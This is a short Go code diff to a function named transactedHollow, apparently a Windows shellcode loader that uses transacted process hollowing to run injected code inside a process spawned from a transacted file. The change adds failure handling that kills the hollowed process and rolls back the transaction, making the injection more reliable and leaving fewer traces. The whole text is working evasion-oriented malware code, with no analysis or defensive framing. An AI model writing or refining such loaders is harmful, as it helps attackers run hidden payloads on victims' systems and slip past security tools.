@@ -81,10 +81,24 @@ func transactedHollow(shellcode []byte) error {
 		return fmt.Errorf("CreateProcessW from transacted file failed")
 	}
 
-	procResumeThread.Call(pi.hThread)
+	resumed, _, _ := procResumeThread.Call(pi.hThread)
+	if resumed == ^uintptr(0) {
+		procTerminateProcess.Call(pi.hProcess, 1)
+		procRollbackTransaction.Call(hTx)
+		procCloseHandle.Call(pi.hThread)
+		procCloseHandle.Call(pi.hProcess)
+		return fmt.Errorf("ResumeThread failed; transacted process terminated")
+	}
 	procCloseHandle.Call(pi.hThread)
+
+	committed, _, _ := procCommitTransaction.Call(hTx)
+	if committed == 0 {
+		procTerminateProcess.Call(pi.hProcess, 1)
+		procRollbackTransaction.Call(hTx)
+		procCloseHandle.Call(pi.hProcess)
+		return fmt.Errorf("CommitTransaction failed; transacted process terminated and rolled back")
+	}
 	procCloseHandle.Call(pi.hProcess)
 
-	procCommitTransaction.Call(hTx)
 	return nil
 }
